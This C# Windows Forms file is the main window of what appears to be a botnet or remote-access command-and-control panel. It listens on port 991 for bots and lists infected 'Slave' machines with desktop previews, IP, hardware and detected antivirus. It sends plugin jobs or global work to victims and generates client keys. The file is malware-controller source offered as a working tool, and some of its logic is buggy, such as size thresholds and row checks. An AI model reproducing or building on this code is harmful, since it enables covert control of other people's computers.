using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using SimpleTool.Configs;
using SimpleTool.Enums;
using SimpleTool.Lists;
using SimpleTool.Network;
using SimpleTool.Tools;
using SimpleTool.ToolWindows;
using SimpleTool.Workers;

namespace SimpleTool
{
    public partial class mainFrm : Form
    {
        public static bool cancelThreads = false;
        private string lastStatus = "";
        public bool configLoaded = false;


        public mainFrm()
        {
            InitializeComponent();
        }

        private void StatusUpdater()
        {
            long memUsage;
            // Monitors the NetworkHandler class for status updates and updates from the class static string changes
            while (!cancelThreads)
            {
                if (lastStatus == "" & lastStatus != NetworkHandler.serverStatus)
                {
                    lastStatus = NetworkHandler.serverStatus;
                    UpdateStatusLabel(NetworkHandler.serverStatus);
                }
                Process me = Process.GetCurrentProcess();
                memUsage = me.PagedMemorySize64;
                UpdateRAMLabel($"RAM Used: {Convert.ToDecimal(memUsage* 0.000001).ToString("#.##")}MB");
                UpdateNetworkUsage();
                Thread.Sleep(700);
            }
        }

        private void UpdateNetworkUsage()
        {
            DataSize size = DataSize.Bytes;
            decimal conv = 0;
            if (WorkQueue.TotalBytesProcessed >= 1024 & WorkQueue.TotalBytesProcessed < 1000024)
            {
                size = DataSize.KB;
                conv = WorkQueue.TotalBytesProcessed / 1024; // KB
            }
            if (WorkQueue.TotalBytesProcessed >= 1000024 & WorkQueue.TotalBytesProcessed < 1073741824)
            {
                size = DataSize.MB;
                conv = WorkQueue.TotalBytesProcessed / 1000024; // MB
            }
            if (WorkQueue.TotalBytesProcessed >= 1073741824 & WorkQueue.TotalBytesProcessed < 1073741824)
            {
                size = DataSize.GB;
                conv = WorkQueue.TotalBytesProcessed / 1073741824; // GB
            }
            lblNetworkStats.Text = $"Network Usage: {conv.ToString("F")} {size}";
        }

        private void UpdateRAMLabel(string data)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<string>(UpdateRAMLabel), data);
                return;
            }
            memUsageLabel.Text = data;
        }

        private void UpdateStatusLabel(string status)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<string>(UpdateStatusLabel), lastStatus);
                return;
            }

            serverStatus.Text = $"Server Status: {status}";
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void mainFrm_Load(object sender, EventArgs e)
        {
            ConfigIO cIO = new ConfigIO();
            cIO.LoadConfig(); // Read config if present
            cIO.Dispose();

            serverStatus.Text = "Server Status: Initializing...";
            Task.Run(() => { NetworkHandler.StartListening(991);}); // Master thread for bot handling
            Task.Run(() => { StatusUpdater();}); // Status update thread
        }

        private void addDumbyBotToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // 5 columns right now so far
            // Picture | OS | IP | CPU and RAM | Detected AV's
            //    1       2    3        4             5
            DataGridViewRow row = new DataGridViewRow();
            row.Height = 50;
            DataGridViewCell cell = new DataGridViewTextBoxCell();
            for (var x = 1; x <= 6; x++)
            {
                switch (x)
                {
                    case 1:
                        // First column will ALWAYS be the desktop preview image
                        cell = new DataGridViewImageCell();
                        cell.Value = Properties.Resources.preview;
                        row.Cells.Add(cell);
                        break;
                    case 2:
                        cell = new DataGridViewTextBoxCell();
                        cell.Value = "Win10";
                        row.Cells.Add(cell);
                        break;
                    case 3:
                        cell = new DataGridViewTextBoxCell();
                        cell.Value = "127.0.0.1";
                        row.Cells.Add(cell);
                        break;
                    case 4:
                        cell = new DataGridViewTextBoxCell();
                        cell.Value = "i7 | 32GB";
                        row.Cells.Add(cell);
                        break;
                    case 5:
                        cell = new DataGridViewTextBoxCell();
                        cell.Value = "TEST-ID";
                        row.Cells.Add(cell);
                        break;
                    case 6:
                        cell = new DataGridViewTextBoxCell();
                        cell.Value = "Windows Defender";
                        row.Cells.Add(cell);
                        break;
                    default:
                        break;
                }
            }
            botView.Rows.Add(row);
            for (int i = 0; i < botView.Columns.Count; i++)
                if (botView.Columns[i] is DataGridViewImageColumn)
                {
                    ((DataGridViewImageColumn)botView.Columns[i]).ImageLayout = DataGridViewImageCellLayout.Stretch;
                    break;
                }
        }

        private void BotViewOnCellDoubleClick(object sender, DataGridViewCellEventArgs e)
        {
            // From here we can handle when a user double clicks to do something with the selected cell
        }

        private void menuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {

        }

        private void generateMoreKeysToolStripMenuItem_Click(object sender, EventArgs e)
        {
            KeyGeneration kg = new KeyGeneration();
            kg.ShowDialog();
            kg.Dispose(); // Once window closes we'll release resources
        }

        private void listKeysToolStripMenuItem_Click(object sender, EventArgs e)
        {
            KeyWindow kw = new KeyWindow();
            kw.ShowDialog();
            kw.Dispose(); // Once closed we can dispose
        }

        private void statusStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {

        }

        private void reloadConfigToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ConfigIO cIO = new ConfigIO();
            cIO.LoadConfig();
            cIO.Dispose();
        }

        private void saveConfigToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ConfigIO cIO = new ConfigIO();
            cIO.SaveConfig();
            cIO.Dispose();
        }

        private void botView_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                botMenu.Show(Cursor.Position.X, Cursor.Position.Y);
            }
        }
        
        private void botView_MouseDown(object sender, DataGridViewCellMouseEventArgs ex)
        {
            int selectedBiodataId = 0;
            if (ex.Button == MouseButtons.Right)
            {
                try
                {
                    botView.CurrentCell = botView.Rows[ex.RowIndex].Cells[ex.ColumnIndex];
                    // Can leave these here - doesn't hurt
                    botView.Rows[ex.RowIndex].Selected = true;
                    botView.Focus();

                    selectedBiodataId = Convert.ToInt32(botView.Rows[ex.RowIndex].Cells[1].Value);
                }
                catch (Exception)
                {

                }
            }
        }

        private void botRefresh_Tick(object sender, EventArgs e)
        {

            for (int x = 0; x < ClientHandler.Slaves.Count; x++) // Go through bot list
            {
                if (ClientHandler.Slaves[x].OnlineStatus == OnlineInfo.Online)
                {
                    if (NeedsAdded(ClientHandler.Slaves[x])) // Bot not in list, add it
                    {
                        AddNewBot(ClientHandler.Slaves[x]);
                    }
                }
                else
                {
                    if (botView.Rows.Count != 0)
                    {
                        if (!NeedsAdded(ClientHandler.Slaves[x]))
                        {
                            RemoveBot(ClientHandler.Slaves[x]);
                            ClientHandler.Slaves.RemoveAt(x);
                        }
                    }
                }
            }
        }

        private bool NeedsAdded(Slave slave)
        {
            if (botView.Rows.Count == 0) // nothing in list, add it
            {
                return true;
            }
            for (int y = 0; y < botView.Rows.Count;y++) // Each row
            {
                string cellValue = (string)botView.Rows[y].Cells[4].Value;
                    if (cellValue.Contains(slave.ClientID))
                    {
                        return false;
                    }
                    else
                    {
                        return true;
                    }
            }
            // Default handle
            return false;
        }

        private void AddNewBot(Slave slave)
        {
            // 5 columns right now so far
            // Picture | OS | IP | CPU and RAM | Detected AV's
            //    1       2    3        4             5
            DataGridViewRow row = new DataGridViewRow();
            row.Height = 50;
            DataGridViewCell cell = new DataGridViewTextBoxCell();
            for (var x = 1; x <= 5; x++)
            {
                switch (x)
                {
                    case 1:
                        // First column will ALWAYS be the desktop preview image
                        cell = new DataGridViewImageCell();
                        cell.Value = slave.PreviewImg;
                        row.Cells.Add(cell);
                        break;
                    case 2:
                        cell = new DataGridViewTextBoxCell();
                        cell.Value = slave.OSVersion;
                        row.Cells.Add(cell);
                        break;
                    case 3:

                        cell = new DataGridViewTextBoxCell();
                        cell.Value = slave.IP;
                        row.Cells.Add(cell);
                        break;
                    case 4:
                        cell = new DataGridViewTextBoxCell();
                        cell.Value = $"{slave.ProcessorInfo} | {slave.RamPresent}";
                        row.Cells.Add(cell);
                        break;
                    case 5:
                        cell = new DataGridViewTextBoxCell();
                        cell.Value = slave.ClientID;
                        row.Cells.Add(cell);
                        break;
                    case 6:
                        cell = new DataGridViewTextBoxCell();
                        cell.Value = ClientHandler.GetAVFormatted(slave);
                        row.Cells.Add(cell);
                        break;
                    default:
                        break;
                }
            }
            botView.Rows.Add(row);
            SetImageStretch();
        }

        private void RemoveBot(Slave slave)
        {
            for (int x = 0; x < botView.Rows.Count; x++)
            {
                string cellValue = (string) botView.Rows[x].Cells[4].Value;
                if (cellValue.Contains(slave.ClientID))
                {
                    botView.Rows.RemoveAt(x); // Remove this bot from list
                }
            }
        }

        private void SetImageStretch()
        {
            for (int i = 0; i < botView.Columns.Count; i++)
                if (botView.Columns[i] is DataGridViewImageColumn)
                {
                    ((DataGridViewImageColumn)botView.Columns[i]).ImageLayout = DataGridViewImageCellLayout.Stretch;
                    break;
                }
        }

        private void addSlaveToListToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Slave slave = new Slave();
            slave.OnlineStatus = OnlineInfo.Online;
            slave.IP = "127.0.0.1";
            slave.ClientID = "kfjhdsbfiunsfjn";
            slave.OSVersion = "Win10";
            slave.ProcessorInfo = "i7 7820x";
            slave.RamPresent = "32GB";
            slave.Authorized = true;
            ClientHandler.Slaves.Add(slave);
        }

        private void markSlaveOfflineToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int x = 0; x < ClientHandler.Slaves.Count; x++)
            {
                ClientHandler.Slaves[x].OnlineStatus = OnlineInfo.Offline;
            }
        }

        private void enableAssigningKeysToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (enableAssigningKeysToolStripMenuItem.Checked)
            {
                ClientConfig.AssignNewKeys = true;
            }
            else
            {
                ClientConfig.AssignNewKeys = false;
            }
        }

        private void testPluginToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PluginUI plug = new PluginUI();
            plug.ShowDialog();
        }

        private void loadPluginToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using(var form = new PluginUI())
            {
                if (botView.SelectedCells.Count > 0)
                {
                    int selectedrowindex = botView.SelectedCells[0].RowIndex;
                    DataGridViewRow selectedRow = botView.Rows[selectedrowindex];
                    string id = Convert.ToString(selectedRow.Cells["IDColumn"].Value);
                    if (!String.IsNullOrWhiteSpace(id))
                    {
                        Slave client = new Slave();
                        for (int x = 0; x < ClientHandler.Slaves.Count; x++)
                        {
                            if (ClientHandler.Slaves[x].ClientID.Contains(id))
                            {
                                Debug.WriteLine($"Client {ClientHandler.Slaves[x].ClientID} being selected...");
                                client = ClientHandler.Slaves[x];
                            }
                        }

                        form.ClientID = client.ClientID;
                        form.ShowDialog();
                        if (!form.UserCanceled & form.PluginWork != null)
                        {
                            WorkQueue.SubmitJob(form.PluginWork);
                        }
                        else
                        {
                            Debug.WriteLine("Error during plugin validation checking...");
                        }
                    }
                    else
                    {
                        Debug.WriteLine("ERROR READING ROW CLIENT IP!!!");
                    }
                }
            }
        }

        private void globalWorkAssignmentToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var ui = new GlobalWorkUI())
            {
                ui.ShowDialog();
            }
        }

        private void testGlobalWorkToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (GlobalWorkUI ui = new GlobalWorkUI())
            {
                ui.ShowDialog();
            }
        }
    }
}
